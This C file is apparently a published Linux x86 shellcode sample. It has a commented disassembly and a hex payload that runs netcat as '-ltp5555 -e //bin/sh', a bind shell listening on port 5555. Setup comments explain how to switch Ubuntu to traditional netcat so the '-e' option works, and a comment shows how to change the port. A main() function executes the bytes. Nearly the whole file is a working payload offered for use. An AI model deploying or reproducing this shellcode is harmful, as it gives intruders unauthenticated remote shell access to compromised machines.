/*
#Greetz : Bomberman(Leader)
#Author : B3mB4m
#Concat : Do not disturb - Bomberman


#Netcat openbsd version (which is default installed in ubuntu) have not "-e" option.
#So if you are trying to test on ubuntu(like me) you must change version to traditional.

#Typing this:
	#1) sudo update-alternatives --config nc
	#2) Select the option /bin/nc.traditional


Disassembly of section .text:

08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 6e 2f 6e 63       	push   $0x636e2f6e
 8048068:	68 2f 2f 62 69       	push   $0x69622f2f
 804806d:	89 e3                	mov    %esp,%ebx
 804806f:	50                   	push   %eax
 8048070:	68 35 35 35 35       	push   $0x35353535 		#PORT
 8048075:	68 2d 6c 74 70       	push   $0x70746c2d
 804807a:	89 e1                	mov    %esp,%ecx
 804807c:	50                   	push   %eax
 804807d:	68 2f 2f 73 68       	push   $0x68732f2f
 8048082:	68 2f 62 69 6e       	push   $0x6e69622f
 8048087:	68 2d 65 2f 2f       	push   $0x2f2f652d
 804808c:	89 e2                	mov    %esp,%edx
 804808e:	50                   	push   %eax
 804808f:	52                   	push   %edx
 8048090:	51                   	push   %ecx
 8048091:	53                   	push   %ebx
 8048092:	89 e7                	mov    %esp,%edi
 8048094:	b0 0b                	mov    $0xb,%al
 8048096:	89 f9                	mov    %edi,%ecx
 8048098:	31 d2                	xor    %edx,%edx
 804809a:	cd 80                	int    $0x80
*/

#include <stdio.h>
#include <string.h>

char *loveme = "\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50\x68\x35\x35\x35"
				"\x35\x68\x2d\x6c\x74\x70\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68"
				"\x2d\x65\x2f\x2f\x89\xe2\x50\x52\x51\x53\x89\xe7\xb0\x0b\x89\xf9\x31\xd2\xcd\x80";

// "\x68-----\x35\x35\x35\x35\-------x68\"  There port change however you like.

int main(void){
	fprintf(stdout,"Length: %d\n",strlen(loveme));
	(*(void(*)()) loveme)();}